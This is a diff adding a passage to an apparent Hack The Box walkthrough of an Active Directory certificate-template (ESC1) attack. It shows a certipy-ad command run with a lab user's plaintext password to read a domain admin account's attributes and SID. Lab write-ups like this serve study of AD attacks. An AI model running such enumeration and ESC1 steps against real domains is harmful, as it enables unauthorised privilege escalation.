@@ -524,3 +524,22 @@ Certificate Templates
 ```
 As seen here its now vulnerable to ESC1
 
+```python
+certipy-ad account -u 'amanda' -p 'Ashare1972' -dc-ip '10.129.15.12' -user 'sizzler' read      
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Reading attributes for 'sizzler':
+    cn                                  : sizzler
+    distinguishedName                   : CN=sizzler,CN=Users,DC=HTB,DC=LOCAL
+    name                                : sizzler
+    objectSid                           : S-1-5-21-2379389067-1826974543-3574127760-1604
+    sAMAccountName                      : sizzler
+    userAccountControl                  : 512
+    whenCreated                         : 2018-07-12T14:29:49+00:00
+    whenChanged                         : 2018-07-12T15:03:19+00:00
+```
+First ill get the SID of the domain admin which i can tell from bloodhound is `sizzler` and `administrator`
+
+```python
+
+```
